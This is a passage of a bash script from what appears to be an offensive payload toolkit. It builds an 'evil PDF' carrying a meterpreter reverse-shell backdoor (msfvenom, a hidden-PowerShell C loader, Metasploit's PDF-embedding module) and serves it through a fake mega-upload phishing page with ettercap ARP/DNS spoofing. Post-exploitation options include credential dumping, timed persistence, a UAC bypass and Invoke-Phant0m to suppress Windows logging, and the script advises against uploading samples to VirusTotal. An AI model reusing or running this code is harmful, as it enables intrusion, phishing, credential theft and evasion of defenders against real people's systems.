            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ----------------------------------------------------
# EVIL PDF BUILDER
# ----------------------------------------------------
sh_shellcode15 () {

echo "[☠] EVIL PDF BUILDER -> running..."
echo "[☠] targets: windows xp/vista/7!"
sleep 1
# input PDF output format
oUt=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nevil PDF builder\ncrypting mechanisms available:" --radiolist --column "Pick" --column "Option" TRUE "base64" FALSE "random xor key" --width 300 --height 200) > /dev/null 2>&1


if [ "$oUt" = "base64" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF NAME ☠" --text "Enter pdf output name\nexample: EvilPdf" --width 300) > /dev/null 2>&1
Myd0=$(zenity --title "☠ SELECT PDF FILE TO BE EMBEDDED ☠" --filename=$IPATH --file-selection --text "chose PDF file to use to be serve as template") > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="EvilPdf";fi
if [ -z "$Myd0" ]; then echo "${RedF}[x]${white} This Module Requires PDF absoluct path input";sleep 3; sh_exit;fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
echo "[☠] meterpreter over SSL sellected .."
sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    TROJAN  : $N4m.pdf
    FORMAT  : PSH-CMD -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
fi


# display shellcode
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $str0
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


echo "[☠] Building template -> template.c!"
sleep 2
# build template file in C language
# reproduction of venom option 6 payload
echo "// C template | Author: r00t-3xp10it " > $IPATH/output/template.c
echo "// execute shellcode powershell base 64 encoded into memory (ram) " >> $IPATH/output/template.c
echo "// ---" >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "#include <stdio.h> " >> $IPATH/output/template.c
echo "#include <stdlib.h> " >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "int main()" >> $IPATH/output/template.c
echo "{" >> $IPATH/output/template.c
echo ' system("powershell -nop -exec bypass -win Hidden -noni -enc InJ3C"); ' >> $IPATH/output/template.c
echo " return 0; " >> $IPATH/output/template.c
echo "}" >> $IPATH/output/template.c

# injecting shellcode into template using SED+bash variable ( $str0 ) = command substitution
sed -i "s|InJ3C|$str0|" $IPATH/output/template.c


# compile template.c into one stand-alone-executable file using mingw32
# template.c (C code to be compiled) -o (save output name)
echo "[☠] Compiling template.c -> backdoor.exe!"
sleep 2
$ComP $IPATH/output/template.c -o $IPATH/output/backdoor.exe -mwindows
strip --strip-debug $IPATH/output/backdoor.exe



# if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file
# using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1


# move files from metasploit to local directory
mv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.pdf|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.pdf|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi




# ---------------------------------------
# chose to build the xor encrypted one :D
# ---------------------------------------
else



# config settings in PDF_encoder.py script
ec=`echo ~`
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF OUTPUT NAME ☠" --text "Enter pdf output name\nexample: XorPdf" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
sleep 2
cd $IPATH/templates/evil_pdf
cp PDF_encoder.py PDF_encoder[bak].py
# config pdf_encoder.py
sed -i "s|Sk3lL3T0n|$IPATH/templates/evil_pdf/skelleton.c|" PDF_encoder.py
sed -i "s|EXE::CUSTOM backdoor.exe|EXE::CUSTOM $ec/backdoor.exe|" PDF_encoder.py
sed -i "s|Lh0St|$lhost|" PDF_encoder.py
sed -i "s|lP0Rt|$lport|" PDF_encoder.py


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="XorPdf";fi


# runing evil-pdf-builder python script
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
# moving files
mv PDF_encoder[bak].py PDF_encoder.py
mv ~/backdoor.exe $IPATH/output/backdoor.exe
mv ~/backdoor.pdf $IPATH/output/$N4m.pdf
echo "[☠] files generated into output folder..."
cd $IPATH


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_c
